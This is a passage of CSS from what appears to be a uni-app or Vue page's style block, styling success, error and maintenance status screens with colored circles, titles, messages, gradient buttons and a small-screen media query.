    box-shadow: 0 8rpx 24rpx rgba(239, 68, 68, 0.3);
}

.maintenance-circle {
    background: linear-gradient(135deg, #F59E0B 0%, #D97706 100%);
    box-shadow: 0 8rpx 24rpx rgba(245, 158, 11, 0.3);
}

.status-content {
    margin-bottom: 40rpx;
}

.status-title {
    display: block;
    font-size: 40rpx;
    font-weight: 700;
    margin-bottom: 16rpx;
}

.success-title {
    color: #71dbd3;
}

.error-title {
    color: #EF4444;
}

.maintenance-title {
    color: #F59E0B;
}

.status-message {
    display: block;
    font-size: 30rpx;
    color: #1A1A1A;
    margin-bottom: 12rpx;
    font-weight: 600;
}

.status-description {
    display: block;
    font-size: 26rpx;
    color: #6B7280;
    line-height: 1.6;
}

.success-btn {
    background: linear-gradient(135deg, #71dbd3 0%, #4ecdc4 100%);
    color: #1A1A1A;
    box-shadow: 0 4rpx 12rpx rgba(113, 219, 211, 0.3);
}

.error-btn {
    background: linear-gradient(135deg, #EF4444 0%, #DC2626 100%);
    box-shadow: 0 4rpx 12rpx rgba(239, 68, 68, 0.3);
}

.maintenance-btn {
    background: linear-gradient(135deg, #F59E0B 0%, #D97706 100%);
    box-shadow: 0 4rpx 12rpx rgba(245, 158, 11, 0.3);
}

/* 响应式适配 */
@media screen and (max-width: 375px) {
    .main-title {
        font-size: 36rpx;
    }

    .subtitle {
        font-size: 22rpx;
    }
}
</style>
